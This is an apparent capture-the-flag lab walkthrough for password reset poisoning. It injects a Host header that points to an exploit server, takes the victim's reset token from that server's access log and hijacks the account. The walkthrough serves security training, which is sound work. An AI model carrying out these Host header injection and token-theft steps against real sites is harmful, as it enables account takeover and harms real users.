# Exploiting Basic Password Reset Poisoning

This guide delivers a clear, creative, and organized walkthrough to exploit a **password reset poisoning** vulnerability. Imagine slipping a forged letter into the server's mailbox, redirecting a victim's password reset token to your own trap! The objective is to manipulate the `Host` header in a password reset request to capture the user `carlos`'s reset token, hijack their account, and solve the lab.

## Objective
Poison the password reset process by altering the `Host` header to redirect the reset link to your exploit server, steal `carlos`'s token, and change their password to gain access.

## Prerequisites
- Burp Suite with Proxy and Repeater modules configured.
- Access to the lab application with a login page and "Forgot your password?" feature.
- An exploit server (e.g., `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`) provided by the lab.
- A lab-provided email client to receive reset emails.

## Background on the Vulnerability
The password reset functionality generates a URL with a `temp-forgot-password-token` sent via email. The application uses the `Host` header to construct this URL but fails to validate it, allowing attackers to inject an arbitrary host (e.g., their exploit server). This redirects the reset link, exposing the token in the exploit server’s access log, enabling account takeover.

## Steps to Solve the Lab

### Step 1: Test the Password Reset Functionality
1. Navigate to the login page and click **Forgot your password?**.
2. Request a password reset for your own account (enter your username).
3. Open the lab’s email client and check for the reset email.
4. **Observation**: The email contains a URL with a `temp-forgot-password-token` query parameter, e.g., `https://lab-id.web-security-academy.net/forgot-password?temp-forgot-password-token=TOKEN`.
5. Click the link, reset your password, and confirm the process works.

### Step 2: Analyze the Reset Request
1. In Burp Suite, go to **Proxy > HTTP history** and locate the `POST /forgot-password` request from your reset attempt.
2. Note the request includes a `username` body parameter (e.g., `username=your-username`).
3. Right-click the request and select **Send to Repeater**.

### Step 3: Test Host Header Manipulation
1. In Repeater, modify the `Host` header to an arbitrary value (e.g., `example.com`):
   ```
   Host: example.com
   ```
2. Send the request.
3. Check the email client for a new reset email.
4. **Observation**: The reset URL now uses `example.com` (e.g., `http://example.com/forgot-password?temp-forgot-password-token=TOKEN`), confirming the `Host` header controls the URL.

### Step 4: Poison the Reset Link
1. In Repeater, change the `Host` header to your exploit server’s domain:
   ```
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
2. Update the `username` parameter to `carlos`:
   ```
   username=carlos
   ```
3. Send the request.
4. **Observation**: The reset email is sent with a URL pointing to your exploit server, e.g., `http://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=TOKEN`.

### Step 5: Capture the Reset Token
1. On your exploit server, open the **Access Log**.
2. Locate the `GET /forgot-password` request containing the `temp-forgot-password-token` for `carlos`.
3. Copy the token value.
4. **Observation**: The token is exposed because the reset link was redirected to your server.

### Step 6: Hijack Carlos’s Account
1. In the email client, copy the original reset URL from your first email (e.g., `https://lab-id.web-security-academy.net/forgot-password?temp-forgot-password-token=YOUR-TOKEN`).
2. Replace the token with `carlos`’s token from the access log.
3. Visit the modified URL in the browser.
4. Set a new password for `carlos`.
5. Log in as `carlos` using the new password.
6. **Observation**: Successful login solves the lab.

### Step 7: Verify Success
1. If the lab does not confirm completion, verify:
   - The `Host` header points to your exploit server.
   - The `username=carlos` parameter is correct.
   - The token was copied accurately from the access log.
   - The reset URL and login credentials are valid.
2. **Observation**: Logging in as `carlos` completes the lab.